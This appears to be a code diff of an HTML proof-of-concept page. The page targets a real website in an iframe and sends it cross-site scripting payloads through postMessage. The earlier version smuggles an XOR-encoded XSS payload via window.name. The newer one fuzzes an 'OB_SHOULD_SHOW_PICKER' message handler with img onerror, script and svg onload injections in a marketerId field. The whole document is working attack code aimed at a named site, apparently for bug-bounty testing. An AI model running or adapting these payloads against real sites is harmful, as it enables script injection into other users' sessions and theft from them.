@@ -1,33 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>PoC</title>
-</head>
-<body>
-  <h2>✅ PoC: DOM XSS via postMessage + window.name</h2>
-  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>
+  <head>
+    <title>Syfe PoC</title>
+  </head>
+  <body>
+    <h1>✅ PoC: Send postMessage</h1>
+    <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>
 
-  <script>
-    function xorEncode(str, key = 0x66) {
-      const keyHex = key.toString(16).padStart(2, '0');
-      const encoded = Array.from(str).map(c => {
-        return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
-      }).join('');
-      return keyHex + encoded;
-    }
+    <script>
+      const iframe = document.getElementById("target");
 
-    const payload = "<img src=x onerror=alert(1)>";
-    const encoded = xorEncode(payload);
+      iframe.onload = () => {
+        console.log("✅ iframe loaded");
 
-    const iframe = document.getElementById("target");
-    iframe.onload = () => {
-      iframe.contentWindow.name = encoded;
-      setTimeout(() => {
-        iframe.contentWindow.postMessage(encoded, "*");
-        console.log("🚀 Payload sent via postMessage + window.name");
-      }, 1000);
-    };
-  </script>
-</body>
+        const payloads = [
+          {
+            message: "OB_SHOULD_SHOW_PICKER",
+            content: {
+              marketerId: ["<img src=x onerror=alert(1)>"]
+            }
+          },
+          {
+            message: "OB_SHOULD_SHOW_PICKER",
+            content: {
+              marketerId: ["<script>alert(document.domain)</script>"]
+            }
+          },
+          {
+            message: "OB_SHOULD_SHOW_PICKER",
+            content: {
+              marketerId: ["<svg/onload=alert('xss')>"]
+            }
+          }
+        ];
+
+        console.log("🚀 Sending fuzzed postMessage payloads...");
+        payloads.forEach((p, i) => {
+          console.log("🔁 Fuzz #" + (i + 1), p);
+          iframe.contentWindow.postMessage(p, "*");
+        });
+      };
+    </script>
+  </body>
 </html>
